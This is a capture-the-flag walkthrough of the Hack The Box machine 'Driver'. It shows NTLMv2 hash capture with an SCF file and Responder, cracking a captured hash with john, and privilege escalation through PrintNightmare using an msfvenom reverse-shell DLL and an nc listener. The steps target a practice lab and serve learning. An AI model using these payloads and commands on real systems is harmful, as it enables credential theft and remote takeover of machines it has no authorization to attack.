@@ -1,0 +1,110 @@
+Hi! This machine was really hard for me, beacose i did not know about SCF's attack, but now i'm lil' less noob than yesterday right?. 
+Jokes aside, this box was full of fun but frustrating at the beginning. Had to read the writeup for this one since most of the tools and CVE's were unkwnown to me.
+
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp  open  msrpc        Microsoft Windows RPC
+445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-01-07T11:05:57
+|_  start_date: 2022-01-07T04:58:55
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 6h59m56s, deviation: 0s, median: 6h59m55s
+
+I did a lot of useless recon like wfuzz and some more nmap scripts for SMB. Looking at the HTTP server on port 80 (creds "admin" "admin"). We can upload files
+The guide i'd use to review this attack is the following: 
+
+	-> https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/     it's very explanatory and detailed.
+
+To sum up the attack we have to follow these steps:
+	
+	1) Create a file with a @ at the start and as .scf extension
+		Ex: @test.scf
+
+	2) The content of the file shold be similar to this:
+
+		[Shell]
+		Command=2
+		IconFile=\\<attack box ip>\share\<whatever>.ico
+		[Taskbar]
+		Command=ToggleDesktop
+
+	3) Save the file and before you upload it, we need to set up "responder.py" to capture the NTLMv2 hashes
+	4) So, if you don't have responder.py just: 
+		wget https://github.com/SpiderLabs/Responder/blob/master/Responder.py
+
+	5) Input these parameters for resonder
+		-> responder -wrf --lm -v -I tun0
+	
+		why? 
+
+		When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file		     Windows will try to authenticate to that share with the username and the password of the user. 
+		During that authentication process a random 8 byte challenge key is sent from the server to the client and the hashed NTLM/LANMAN password is encrypted again with this challenge key. 
+		Responder will capture the NTLMv2 hash.
+
+	6) You should recive the NTLMv2 hash:
+
+		[SMB] NTLMv2 Client   : 10.10.11.106
+		[SMB] NTLMv2 Username : DRIVER\tony
+		[SMB] NTLMv2 Hash     : tony::DRIVER:7df2e4bf90b75d15:AD5F0E413093358A217C7E091A6DDF27:0101000000000000DA3AA025D505D801BF389B58D588300200000000020000000000000000000000
+
+	7) Now lets save the hash and crack it using john (could use hashcat as well)
+
+		sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
+		Using default input encoding: UTF-8
+		Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+		Will run 4 OpenMP threads
+		liltony          (tony)
+
+	8) Let's evil-winrm to connect to tony
+		evil-winrm <ip> -u tony -p liltony
+	
+		and we land on C:\Driver\Users\Tony\Desktop
+		so just get the user flag by typing: type user.txt
+
+		8.1) Let's see if Spooler service is running
+			-> Get-Service Spooler
+
+		Status  Name	   DisplayName
+		Running Spooler    PrintSpooler
+
+
+		This is where the fun starts! 
+
+	+++++++++++++++PRIV ESC++++++++++++++++++
+
+    So now we have to set up a bunch of stuff in order to exploit PrintNightmare.
+
+	9) Firstly let's create a malicious dll file, we'll be hosting this file through our own SMB file server
+		msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST <yourIP> LPORT <port> -f dll > <Path-Where-You-Want-It>/rev.dll
+
+	10) Secondly we need to set up a SMB server, we can do this with smbserver.py from impacket
+		sudo python3 smbserver.py <a name for file share> <a path where you want to place the share>
+
+	11) Start a listener with netcat using the PORT you provided to the dll file
+		nc -lnvp <port>
+
+	12) Run the CVE-2021-1675.py like this:
+		sudo python3 CVE-2021-1675.py <victimHostname>/<user>:<password>@<victimIP> '\\<yourIP>\<name-of-share>\<dllFile>'
+
+	13) Enjoy!
